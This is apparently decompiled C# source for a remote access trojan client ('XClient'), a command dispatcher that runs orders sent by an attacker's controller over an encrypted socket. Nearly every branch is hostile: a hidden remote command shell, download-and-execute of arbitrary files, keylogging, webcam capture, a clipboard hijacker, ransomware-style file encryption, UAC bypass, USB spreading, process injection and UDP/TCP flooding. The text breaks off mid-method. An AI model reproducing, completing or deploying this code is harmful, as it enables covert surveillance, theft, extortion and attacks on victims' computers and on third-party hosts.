using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using XClient.My;

namespace XClient.Stub;

public class Messages
{
	private delegate void AppendOutputTextDelegate(string text);

	private static readonly object SPL = RuntimeHelpers.GetObjectValue(ClientSocket.SPL);

	private static int processid;

	public static int RS;

	public static int KL;

	public static string KLP = Path.GetTempPath() + "XKlog.txt";

	public static IntPtr Handle;

	public static int CMS;

	private static Process MyProcess
	{
		[CompilerGenerated]
		get
		{
			return _MyProcess;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataReceivedEventHandler value2 = MyProcess_ErrorDataReceived;
			DataReceivedEventHandler value3 = MyProcess_OutputDataReceived;
			Process myProcess = _MyProcess;
			if (myProcess != null)
			{
				myProcess.ErrorDataReceived -= value2;
				myProcess.OutputDataReceived -= value3;
			}
			_MyProcess = value;
			myProcess = _MyProcess;
			if (myProcess != null)
			{
				myProcess.ErrorDataReceived += value2;
				myProcess.OutputDataReceived += value3;
			}
		}
	}

	public static void AppendOutputText(string text)
	{
		try
		{
			new AppendOutputTextDelegate(AppendOutputText);
			ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"R/", SPL), (object)text)));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void MyProcess_ErrorDataReceived(object sender, DataReceivedEventArgs e)
	{
		AppendOutputText("\r\nError: " + e.Data + "\r\n");
	}

	private static void MyProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
	{
		AppendOutputText("\r\n" + e.Data);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Read(byte[] b)
	{
		//IL_1420: Unknown result type (might be due to invalid IL or missing references)
		//IL_142a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1de4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dfb: Expected O, but got Unknown
		//IL_1f16: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f20: Unknown result type (might be due to invalid IL or missing references)
		//IL_20c0: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				_Closure_0024__12_002D0 arg = default(_Closure_0024__12_002D0);
				_Closure_0024__12_002D0 CS_0024_003C_003E8__locals0 = new _Closure_0024__12_002D0(arg);
				CS_0024_003C_003E8__locals0._0024VB_0024Local_A = Strings.Split(Helper.BS(Helper.AES_Decryptor(b)), Conversions.ToString(SPL), -1, (CompareMethod)0);
				switch (CS_0024_003C_003E8__locals0._0024VB_0024Local_A[0])
				{
				case "|||":
					ClientSocket.Send("|||");
					break;
				case "cbb":
					ClientSocket.Send("cbb");
					break;
				case "KLget":
					if (File.Exists(KLP))
					{
						ClientSocket.Send("KLget");
					}
					break;
				case "FSG":
				{
					object obj16 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
					object[] obj17 = new object[3]
					{
						Settings.uploader,
						null,
						null
					};
					ref string reference16 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
					ref string reference2 = ref reference16;
					obj17[1] = reference16;
					ref string reference17 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[3];
					ref string reference8 = ref reference17;
					obj17[2] = reference17;
					object[] array2 = obj17;
					bool[] obj18 = new bool[3] { false, true, true };
					bool[] array3 = obj18;
					NewLateBinding.LateCall(obj16, (Type)null, "RUN", obj17, (string[])null, (Type[])null, obj18, true);
					if (array3[1])
					{
						reference2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
					}
					if (array3[2])
					{
						reference8 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
					}
					GC.Collect();
					break;
				}
				case "PSleep":
					try
					{
						Thread thread9 = new Thread((ThreadStart)delegate
						{
							NewLateBinding.LateCall(Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), (Type)null, "PreventSleep", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						});
						thread9.Start();
						GC.Collect();
						break;
					}
					catch (Exception projectError39)
					{
						ProjectData.SetProjectError(projectError39);
						ProjectData.ClearProjectError();
						break;
					}
				case "R$":
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"R$", SPL), NewLateBinding.LateGet(Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), (Type)null, "GetText", new object[0], (string[])null, (Type[])null, (bool[])null))));
					break;
				case "bypss":
					try
					{
						Thread thread7 = new Thread((ThreadStart)delegate
						{
							object obj35 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
							object[] obj36 = new object[1] { Settings.path2 };
							object[] array24 = obj36;
							bool[] obj37 = new bool[1] { true };
							bool[] array25 = obj37;
							NewLateBinding.LateCall(obj35, (Type)null, "calluac", obj36, (string[])null, (Type[])null, obj37, true);
							if (array25[0])
							{
								Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array24[0]), typeof(string));
							}
						});
						thread7.Start();
						GC.Collect();
						break;
					}
					catch (Exception projectError31)
					{
						ProjectData.SetProjectError(projectError31);
						ProjectData.ClearProjectError();
						break;
					}
				case "script":
					try
					{
						Thread thread4 = new Thread((ThreadStart)delegate
						{
							object obj40 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
							object[] array29 = new object[2];
							ref string reference22 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
							array29[0] = reference22;
							ref string reference23 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[3];
							array29[1] = reference23;
							object[] array30 = array29;
							bool[] obj41 = new bool[2] { true, true };
							bool[] array31 = obj41;
							NewLateBinding.LateCall(obj40, (Type)null, "exc", array29, (string[])null, (Type[])null, obj41, true);
							if (array31[0])
							{
								reference22 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array30[0]), typeof(string));
							}
							if (array31[1])
							{
								reference23 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array30[1]), typeof(string));
							}
						});
						thread4.Start();
						GC.Collect();
						break;
					}
					catch (Exception projectError18)
					{
						ProjectData.SetProjectError(projectError18);
						ProjectData.ClearProjectError();
						break;
					}
				case "R#":
				{
					string text4 = null;
					Process[] processes = Process.GetProcesses();
					foreach (Process process2 in processes)
					{
						try
						{
							text4 = text4 + Path.GetFileNameWithoutExtension(process2.ProcessName) + Path.GetExtension(process2.MainModule!.FileName!.ToString()) + "|+++|" + Conversions.ToString(process2.Id) + "|+++|" + process2.MainModule!.FileName!.ToString() + "*+*";
						}
						catch (Exception projectError19)
						{
							ProjectData.SetProjectError(projectError19);
							ProjectData.ClearProjectError();
						}
					}
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"R#", SPL), (object)text4), SPL), (object)Process.GetCurrentProcess().MainModule!.FileName!.ToString())));
					break;
				}
				case "Cilpper":
					try
					{
						Thread thread3 = new Thread((ThreadStart)delegate
						{
							object obj42 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
							object[] array32 = new object[2];
							ref string reference24 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
							array32[0] = reference24;
							ref string reference25 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[3];
							array32[1] = reference25;
							object[] array33 = array32;
							bool[] obj43 = new bool[2] { true, true };
							bool[] array34 = obj43;
							NewLateBinding.LateCall(obj42, (Type)null, "Clipper", array32, (string[])null, (Type[])null, obj43, true);
							if (array34[0])
							{
								reference24 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array33[0]), typeof(string));
							}
							if (array34[1])
							{
								reference25 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array33[1]), typeof(string));
							}
						});
						thread3.Start();
						GC.Collect();
						break;
					}
					catch (Exception projectError15)
					{
						ProjectData.SetProjectError(projectError15);
						ProjectData.ClearProjectError();
						break;
					}
				case "R/":
					try
					{
						try
						{
							using Process process = new Process();
							process.StartInfo.FileName = "taskkill.exe";
							process.StartInfo.Arguments = " /pid " + Conversions.ToString(processid) + " /f";
							process.StartInfo.UseShellExecute = false;
							process.StartInfo.RedirectStandardError = false;
							process.StartInfo.RedirectStandardOutput = false;
							process.StartInfo.CreateNoWindow = true;
							process.Start();
							process.WaitForExit();
						}
						catch (Exception projectError16)
						{
							ProjectData.SetProjectError(projectError16);
							ProjectData.ClearProjectError();
						}
						MyProcess = new Process();
						ProcessStartInfo startInfo = MyProcess.StartInfo;
						startInfo.FileName = "CMD.EXE";
						startInfo.UseShellExecute = false;
						startInfo.CreateNoWindow = true;
						startInfo.RedirectStandardInput = true;
						startInfo.RedirectStandardOutput = true;
						startInfo.RedirectStandardError = true;
						startInfo = null;
						MyProcess.Start();
						processid = MyProcess.Id;
						MyProcess.BeginErrorReadLine();
						MyProcess.BeginOutputReadLine();
						AppendOutputText("Process Started at: " + MyProcess.StartTime);
						break;
					}
					catch (Exception projectError17)
					{
						ProjectData.SetProjectError(projectError17);
						ProjectData.ClearProjectError();
						break;
					}
				case "FURL":
					try
					{
						((ServerComputer)MyProject.Computer).get_Network().DownloadFile(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1], CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2]);
						Thread.Sleep(500);
						ClientSocket.Send("RL");
						break;
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
						break;
					}
				case "update":
					try
					{
						Thread thread2 = new Thread((ThreadStart)delegate
						{
							object obj44 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
							object[] obj45 = new object[4]
							{
								Settings.path2,
								Settings.nameee,
								null,
								null
							};
							ref string reference26 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
							obj45[2] = reference26;
							ref string reference27 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[3];
							obj45[3] = reference27;
							object[] array35 = obj45;
							bool[] obj46 = new bool[4] { true, true, true, true };
							bool[] array36 = obj46;
							NewLateBinding.LateCall(obj44, (Type)null, "update", obj45, (string[])null, (Type[])null, obj46, true);
							if (array36[0])
							{
								Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array35[0]), typeof(string));
							}
							if (array36[1])
							{
								Settings.nameee = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array35[1]), typeof(string));
							}
							if (array36[2])
							{
								reference26 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array35[2]), typeof(string));
							}
							if (array36[3])
							{
								reference27 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array35[3]), typeof(string));
							}
						});
						thread2.Start();
						GC.Collect();
						break;
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
						break;
					}
				case "Execute":
					Process.Start(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
					break;
				case "KL":
					if (KL != 1)
					{
						NewLateBinding.LateCall(Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), (Type)null, "logdf", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						KL = 1;
						GC.Collect();
						Application.Run();
					}
					break;
				case "DelP":
					NewLateBinding.LateCall(Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), (Type)null, "del", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "DW":
					Download(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1], CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2]);
					break;
				case "P@":
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"P@", SPL), NewLateBinding.LateGet(Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), (Type)null, "InsProg", new object[0], (string[])null, (Type[])null, (bool[])null))));
					break;
				case "startusb":
					try
					{
						if (Operators.CompareString(Settings.usbC, "1", false) == 0)
						{
							break;
						}
						Thread thread12 = new Thread((ThreadStart)delegate
						{
							object obj24 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
							object[] obj25 = new object[2]
							{
								Settings.path2,
								Settings.nameee
							};
							object[] array15 = obj25;
							bool[] obj26 = new bool[2] { true, true };
							bool[] array16 = obj26;
							NewLateBinding.LateCall(obj24, (Type)null, "startsp", obj25, (string[])null, (Type[])null, obj26, true);
							if (array16[0])
							{
								Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
							}
							if (array16[1])
							{
								Settings.nameee = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[1]), typeof(string));
							}
						});
						thread12.Start();
						Settings.usbC = "1";
						GC.Collect();
						break;
					}
					catch (Exception projectError45)
					{
						ProjectData.SetProjectError(projectError45);
						ProjectData.ClearProjectError();
						break;
					}
				case "PE":
					try
					{
						Thread thread11 = new Thread((ThreadStart)delegate
						{
							object obj27 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
							object[] array17 = new object[2];
							ref string reference20 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
							array17[0] = reference20;
							array17[1] = Helper.frombase64(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[3]);
							object[] array18 = array17;
							bool[] obj28 = new bool[2] { true, false };
							bool[] array19 = obj28;
							NewLateBinding.LateCall(obj27, (Type)null, "injRun", array17, (string[])null, (Type[])null, obj28, true);
							if (array19[0])
							{
								reference20 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array18[0]), typeof(string));
							}
						});
						thread11.Start();
						GC.Collect();
						break;
					}
					catch (Exception projectError44)
					{
						ProjectData.SetProjectError(projectError44);
						ProjectData.ClearProjectError();
						break;
					}
				case "admin":
					try
					{
						Thread thread10 = new Thread((ThreadStart)delegate
						{
							object obj29 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
							object[] obj30 = new object[1] { Settings.path2 };
							object[] array20 = obj30;
							bool[] obj31 = new bool[1] { true };
							bool[] array21 = obj31;
							NewLateBinding.LateCall(obj29, (Type)null, "uac", obj30, (string[])null, (Type[])null, obj31, true);
							if (array21[0])
							{
								Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array20[0]), typeof(string));
							}
						});
						thread10.Start();
						GC.Collect();
						break;
					}
					catch (Exception projectError43)
					{
						ProjectData.SetProjectError(projectError43);
						ProjectData.ClearProjectError();
						break;
					}
				case "url":
					try
					{
						Process.Start(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
						break;
					}
					catch (Exception projectError40)
					{
						ProjectData.SetProjectError(projectError40);
						ProjectData.ClearProjectError();
						break;
					}
				case "CTT":
				{
					string[] array11 = Strings.Split(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1], "|", -1, (CompareMethod)0);
					foreach (string text6 in array11)
					{
						try
						{
							if (File.Exists(text6))
							{
								File.Move(text6, CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2] + Path.GetFileName(text6));
							}
							if (Directory.Exists(text6))
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().MoveDirectory(text6, CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2] + Path.GetFileName(text6), true);
							}
						}
						catch (Exception projectError34)
						{
							ProjectData.SetProjectError(projectError34);
							ProjectData.ClearProjectError();
						}
					}
					Thread.Sleep(500);
					ClientSocket.Send("RL");
					break;
				}
				case "getinfo":
					ClientSocket.Send("getinfo");
					break;
				case "RENC":
					if (RS != 1)
					{
						RS = 1;
						object obj4 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
						object[] obj5 = new object[5]
						{
							Helper.GetHash(Helper.ID()),
							null,
							null,
							null,
							null
						};
						ref string reference7 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
						ref string reference8 = ref reference7;
						obj5[1] = reference7;
						ref string reference9 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[3];
						ref string reference2 = ref reference9;
						obj5[2] = reference9;
						ref string reference10 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[4];
						ref string reference6 = ref reference10;
						obj5[3] = reference10;
						ref string reference11 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[5];
						ref string reference4 = ref reference11;
						obj5[4] = reference11;
						object[] array2 = obj5;
						bool[] obj6 = new bool[5] { false, true, true, true, true };
						bool[] array3 = obj6;
						NewLateBinding.LateCall(obj4, (Type)null, "ENC", obj5, (string[])null, (Type[])null, obj6, true);
						if (array3[1])
						{
							reference8 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
						}
						if (array3[2])
						{
							reference2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
						}
						if (array3[3])
						{
							reference6 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
						}
						if (array3[4])
						{
							reference4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[4]), typeof(string));
						}
						RS = 2;
						GC.Collect();
					}
					break;
				case "CPP":
				{
					string[] array5 = Strings.Split(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1], "|", -1, (CompareMethod)0);
					foreach (string text2 in array5)
					{
						try
						{
							if (File.Exists(text2))
							{
								File.Copy(text2, CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2] + Path.GetFileName(text2));
							}
							if (Directory.Exists(text2))
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().CopyDirectory(text2, CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2] + Path.GetFileName(text2), true);
							}
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							ProjectData.ClearProjectError();
						}
					}
					Thread.Sleep(500);
					ClientSocket.Send("RL");
					break;
				}
				case "ACTG":
				{
					object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), (Type)null, "GetActiveWindows", new object[0], (string[])null, (Type[])null, (bool[])null));
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						enumerator = ((IEnumerable)objectValue2).GetEnumerator();
						while (enumerator.MoveNext())
						{
							string text = Conversions.ToString(enumerator.Current);
							try
							{
								ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"ACTG", SPL), (object)text)));
							}
							catch (Exception projectError7)
							{
								ProjectData.SetProjectError(projectError7);
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					GC.Collect();
					ClientSocket.Send("ENBC");
					break;
				}
				case "GetDrives":
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FileManager", SPL), (object)getDrives())));
					break;
				case "rec":
					Helper.CloseMutex();
					Application.Restart();
					Environment.Exit(0);
					break;
				case "WBCM":
					if (Cam())
					{
						ClientSocket.Send("WBCM");
					}
					break;
				case "DEC":
				{
					object obj21 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
					object[] obj22 = new object[2]
					{
						Helper.GetHash(Helper.ID()),
						null
					};
					ref string reference19 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
					ref string reference2 = ref reference19;
					obj22[1] = reference19;
					object[] array2 = obj22;
					bool[] obj23 = new bool[2] { false, true };
					bool[] array3 = obj23;
					NewLateBinding.LateCall(obj21, (Type)null, "DEC", obj22, (string[])null, (Type[])null, obj23, true);
					if (array3[1])
					{
						reference2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
					}
					Thread.Sleep(500);
					ClientSocket.Send("RL");
					GC.Collect();
					break;
				}
				case "WL":
				{
					object obj19 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
					object[] array14 = new object[1];
					ref string reference18 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
					ref string reference2 = ref reference18;
					array14[0] = reference18;
					object[] array2 = array14;
					bool[] obj20 = new bool[1] { true };
					bool[] array3 = obj20;
					NewLateBinding.LateCall(obj19, (Type)null, "WL", array14, (string[])null, (Type[])null, obj20, true);
					if (array3[0])
					{
						reference2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					break;
				}
				case "clss":
					NewLateBinding.LateCall(Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), (Type)null, "clearr", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "RDEC":
					if (RS == 2)
					{
						RS = 1;
						NewLateBinding.LateCall(Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), (Type)null, "DEC", new object[1] { Helper.GetHash(Helper.ID()) }, (string[])null, (Type[])null, (bool[])null, true);
						RS = 0;
						GC.Collect();
					}
					break;
				case "Cam":
				{
					if (CMS == 1)
					{
						break;
					}
					CMS = 1;
					byte[] input2;
					try
					{
						input2 = Helper.SB(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"Cam", ClientSocket.SPL), (object)Helper.BS(Shot(Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2]), Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[3]))))));
					}
					catch (Exception projectError41)
					{
						ProjectData.SetProjectError(projectError41);
						CMS = 0;
						ProjectData.ClearProjectError();
						break;
					}
					try
					{
						lock (ClientSocket.S)
						{
							using MemoryStream memoryStream2 = new MemoryStream();
							byte[] array12 = Helper.AES_Encryptor(input2);
							byte[] array13 = Helper.SB(Conversions.ToString(array12.Length) + "\0");
							memoryStream2.Write(array13, 0, array13.Length);
							memoryStream2.Write(array12, 0, array12.Length);
							ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
							ClientSocket.S.Send(memoryStream2.ToArray(), 0, (int)memoryStream2.Length, SocketFlags.None);
							CMS = 0;
							GC.Collect();
							break;
						}
					}
					catch (Exception projectError42)
					{
						ProjectData.SetProjectError(projectError42);
						ClientSocket.isConnected = false;
						CMS = 0;
						ProjectData.ClearProjectError();
						break;
					}
				}
				case "runnnnnn":
					MyProcess.StandardInput.WriteLine(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
					MyProcess.StandardInput.Flush();
					break;
				case "Delete":
				{
					string text7 = CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1];
					if (Operators.CompareString(text7, "Folder", false) != 0)
					{
						if (Operators.CompareString(text7, "File", false) == 0)
						{
							File.Delete(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2]);
						}
					}
					else
					{
						Directory.Delete(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2], recursive: true);
					}
					break;
				}
				case "KLdel":
					try
					{
						File.Delete(KLP);
						break;
					}
					catch (Exception projectError38)
					{
						ProjectData.SetProjectError(projectError38);
						ProjectData.ClearProjectError();
						break;
					}
				case "sendfileto":
					File.WriteAllBytes(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1], Convert.FromBase64String(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2]));
					GC.Collect();
					break;
				case "LN":
					try
					{
						string fileName = Path.GetTempFileName() + "-" + CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1];
						WebClient webClient = new WebClient();
						webClient.DownloadFile(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2], fileName);
						Process.Start(fileName);
						GC.Collect();
						break;
					}
					catch (Exception projectError37)
					{
						ProjectData.SetProjectError(projectError37);
						ProjectData.ClearProjectError();
						break;
					}
				case "kD":
					try
					{
						Process.GetProcessById(Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1])).Kill();
						Thread.Sleep(500);
						File.Delete(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2]);
						break;
					}
					catch (Exception projectError36)
					{
						ProjectData.SetProjectError(projectError36);
						ProjectData.ClearProjectError();
						break;
					}
				case "hidefolderfile":
				{
					FileAttribute val2 = (FileAttribute)2;
					try
					{
						FileSystem.SetAttr(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1], val2);
						break;
					}
					catch (Exception projectError35)
					{
						ProjectData.SetProjectError(projectError35);
						ProjectData.ClearProjectError();
						break;
					}
				}
				case "RSS":
				{
					object obj14 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
					object[] array10 = new object[1];
					ref string reference15 = ref CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
					ref string reference2 = ref reference15;
					array10[0] = reference15;
					object[] array2 = array10;
					bool[] obj15 = new bool[1] { true };
					bool[] array3 = obj15;
					NewLateBinding.LateCall(obj14, (Type)null, "Run", array10, (string[])null, (Type[])null, obj15, true);
					if (array3[0])
					{
						reference2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					GC.Collect();
					break;
				}
				case "ACT":
					ClientSocket.Send("ACT");
					break;
				case "ppp":
					ClientSocket.Send("ppp");
					break;
				case "RST":
					try
					{
						Process.GetProcessById(Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1])).Kill();
						Thread.Sleep(500);
						Process.Start(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2]);
						break;
					}
					catch (Exception projectError33)
					{
						ProjectData.SetProjectError(projectError33);
						ProjectData.ClearProjectError();
						break;
					}
				case "bot":
					try
					{
						Thread thread8 = new Thread((ThreadStart)delegate
						{
							object obj32 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
							object[] obj33 = new object[1] { Settings.path2 };
							object[] array22 = obj33;
							bool[] obj34 = new bool[1] { true };
							bool[] array23 = obj34;
							NewLateBinding.LateCall(obj32, (Type)null, "RunBotKiller", obj33, (string[])null, (Type[])null, obj34, true);
							if (array23[0])
							{
								Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array22[0]), typeof(string));
							}
						});
						thread8.Start();
						GC.Collect();
						break;
					}
					catch (Exception projectError32)
					{
						ProjectData.SetProjectError(projectError32);
						ProjectData.ClearProjectError();
						break;
					}
				case "DDosS":
					if (Operators.CompareString(Settings.dosstu, "!", false) == 0)
					{
						break;
					}
					Settings.doshost = CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1];
					Settings.dosport = CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2];
					Settings.dostype = CS_0024_003C_003E8__locals0._0024VB_0024Local_A[3];
					try
					{
						if (Operators.CompareString(Settings.dostype, "UDP", false) == 0)
						{
							Settings.dTimer2.Interval = 100.0;
						}
						if (Operators.CompareString(Settings.dostype, "TCP", false) == 0)
						{
							Settings.dTimer2.Interval = 1.0;
						}
						Settings.dTimer2.Start();
						Settings.dosstu = "!";
						break;
					}
					catch (Exception projectError30)
					{
						ProjectData.SetProjectError(projectError30);
						ProjectData.ClearProjectError();
						break;
					}
				case "DDosT":
					Settings.dTimer2.Stop();
					Settings.dosstu = null;
					Settings.doshost = null;
					Settings.dosport = null;
					Settings.dostype = null;
					break;
				case "FM":
					try
					{
						Thread thread6 = new Thread((ThreadStart)delegate
						{
							NewLateBinding.LateCall(Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]), (Type)null, "Memory", new object[1] { Helper.frombase64(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[2]) }, (string[])null, (Type[])null, (bool[])null, true);
						});
						thread6.Start();
						GC.Collect();
						break;
					}
					catch (Exception projectError29)
					{
						ProjectData.SetProjectError(projectError29);
						ProjectData.ClearProjectError();
						break;
					}
				case "creatfile":
					try
					{
						File.Create(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]).Dispose();
						Thread.Sleep(500);
						ClientSocket.Send("RL");
						break;
					}
					catch (Exception projectError28)
					{
						ProjectData.SetProjectError(projectError28);
						ProjectData.ClearProjectError();
						break;
					}
				case "FileManager":
					try
					{
						ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FileManager", SPL), (object)getFolders(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1])), (object)getFiles(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]))));
						break;
					}
					catch (Exception projectError27)
					{
						ProjectData.SetProjectError(projectError27);
						ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FileManager", SPL), (object)"Error")));
						ProjectData.ClearProjectError();
						break;
					}
				case "CLOSE":
					try
					{
						ClientSocket.S.Shutdown(SocketShutdown.Both);
						ClientSocket.S.Close();
					}
					catch (Exception projectError26)
					{
						ProjectData.SetProjectError(projectError26);
						ProjectData.ClearProjectError();
					}
					Environment.Exit(0);
					break;
				case "vbb":
					try
					{
						Thread thread5 = new Thread((ThreadStart)delegate
						{
							object obj38 = Helper.objj(CS_0024_003C_003E8__locals0._0024VB_0024Local_A[1]);
